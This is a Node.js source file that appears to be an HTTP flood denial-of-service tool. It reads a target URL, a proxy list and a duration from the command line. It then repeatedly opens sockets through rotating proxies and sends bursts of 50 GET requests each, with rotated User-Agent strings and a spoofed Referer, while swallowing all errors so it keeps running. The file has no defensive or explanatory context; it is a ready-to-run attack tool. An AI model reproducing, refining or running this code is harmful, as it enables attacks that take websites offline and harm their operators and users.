const EventEmitter = require('events');
const fs = require('fs');
const emitter = new EventEmitter();
emitter.setMaxListeners(Number.POSITIVE_INFINITY);
const url = require('url');
const proxies = fs.readFileSync(process.argv[3], 'utf-8').replace(/\r/g, '').split('\n');
var target = process.argv[2];
var time = process.argv[4];
var host = url.parse(target).host;
var theproxy = 0;
var theua = 0;
const useragent = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
var proxy = proxies[theproxy];
var uabizim = useragent[theua];
var int = setInterval(() => {
    theproxy++;
    theua++;
    if (theproxy == proxies.length - 1) {
        theproxy = 0;
    }
    proxy = proxies[theproxy];
    if (proxy && proxy.length > 5) {
        proxy = proxy.split(':');
    } else {
        return false;
    }
	
    if (theua == useragent.length - 1) {
        theua = 0;
    }
    uabizim = useragent[theua];
	
    var s = require('net').Socket();
    s.connect(proxy[1], proxy[0]);
    s.setTimeout(5000);
    for (var i = 0; i < 50; i++) {
        s.write('GET ' + target + ' HTTP/1.1\r\nHost: ' + host + '\r\nReferer: ' + target + '\r\nUser-Agent: ' + uabizim + '\r\nConnection: Keep-Alive\r\n\r\n');
    }
    s.on('data', function() {
        setTimeout(function() {
            s.destroy();
            return delete s;
        }, 5000);
    })
});
setTimeout(() => clearInterval(int), time * 100);
process.on('uncaughtException', function(err) {});
process.on('unhandledRejection', function(err) {});
